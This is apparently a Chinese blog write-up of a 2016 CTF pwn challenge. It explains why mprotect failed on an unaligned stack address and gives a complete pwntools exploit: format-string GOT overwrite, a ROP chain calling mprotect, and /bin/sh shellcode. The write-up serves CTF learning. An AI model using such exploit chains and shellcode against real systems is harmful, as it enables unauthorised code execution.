---
title: mprotect 之痛
date: 2016-05-18 17:36:34
tags: 
 - pwn
 - ctf
---

这道题目源自于 2016安云杯，题目原题可以在文章最后的附件里下载。

当时拿到这道题目以后，想法很简单。使用fmt将puts函数的got改掉换成程序自带的mprotect后门（如图）。先是用mprotect将栈空间段设置为可执行，然后利用gets函数将shellcode放入站上，由于最后没有将eax清空，eax寄存器仍然保存着栈地址，所以我们可以利用 jmp eax 或者 call eax 跳转到栈上执行。（一个简单的pwn案例）

{% asset_img  1.png %}

HOWEVER，说好的flag呢！？为什么mprotect函数执行后总是返回-1 ！？
{% asset_img  4.jpg %}

{% asset_img  2.jpg %}
一脸蒙蔽
{% asset_img  3.jpg %}
一定是我打开方式不对。。这个要先等等，然后再开。。没准就弹个shell给我了。嗯，我信了。

于是各种调试脚本。。。然并软，其中有一次竟然弹给我shell了。。这特么还有概率弹shell的啊，我特么第一次碰到啊。。

查了很多资料。
发现mprotect操作的前两个参数有具体限制的。

{% asset_img  5.png %}

来源于：[http://blog.csdn.net/u010651541/article/details/49913029](http://blog.csdn.net/u010651541/article/details/49913029)

接着，动态调试下。

{% asset_img  6.jpg %}

这边的第一个参数addr明显没有内存页对齐，用`si`跟进函数内部。

这边等dl_resolve操作完成之后，用`print mprotect`打印出mprotect函数在libc中的地址，然后下断点。再`c` 在执行到mprotect函数的位置停下。

{% asset_img  7.png %}

{% asset_img  8.png %}

继续跟进。发现在进行`syscall`系统调用mprotect之后，eax返回了两种不同结果，第一种结果是参数为(0xffe05390,0x80,0x7)的情况，第二种结果是参数为(0xffe05000,0x1000,0x7)的情况，可以发现在内存页对齐的情况下，成功带回eax=0。（这边不知道怎么跟进内核查看，求教大神）

{% asset_img  9.png %}

{% asset_img  10.png %}

接下来，由于mprotect函数之后gets函数没有限制输入字符的长度，我们可以进行面向返回的编程（rop），将栈上的空间设置为可读可写可执行，并将shellcode放在该栈空间上，最后跳转至该栈空间进行shellcode的执行。

exp如下。

```python
from pwn import *
p = process('./safedoor')
context(log_level='debug')

# p = remote('219.146.15.117',8000)
elf = ELF('safedoor')
puts_got = elf.got['puts']
mprotect_plt = elf.symbols['mprotect']
gets_plt = elf.symbols['gets']

ppp_ret = 0x080486cd
p_ret = 0x080483e1

p.recvuntil('KEY:')
m_p = 0x0804858D
page_size = 4096
# x&~(page_size-1)


gdb.attach(p,'b* 0x0804858D\nc')
payload = "%70$p..."
p.sendline(payload)
ebp = p.recvuntil('...')[8:16]
ebp_addr= int(ebp,16)
shellcode_addr  = (ebp_addr-296-0x98)&~(page_size-1)

for x in range(2):
	l = (m_p >> (x*8)) &0xff
	payload = p32(puts_got+x)+"%%%dc"%(l-4)+"%4$hhn..."
	p.sendline(payload)
	p.recvuntil('...')
l = (m_p >> (2*8)) &0xff
payload = p32(puts_got+2)+"%4$hhn..."
p.sendline(payload)
p.recvuntil('...')
l = (m_p >> (3*8)) &0xff
payload = p32(puts_got+3)+"%%%dc"%(l-4)+"%4$hhn..."
p.sendline(payload)
p.recvuntil('...')
p.sendline('STjJaOEwLszsLwRy')
p.recvuntil('\nKEY:')
shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload1 = 'A'*(140)+p32(mprotect_plt)+p32(ppp_ret)+p32(shellcode_addr)+p32(page_size)+p32(7)+p32(gets_plt)+p32(p_ret)+p32(shellcode_addr)+p32(shellcode_addr)
p.sendline(payload1)
p.sendline(shellcode)
p.interactive()

```

题目地址:https://github.com/Winter3un/ctf_task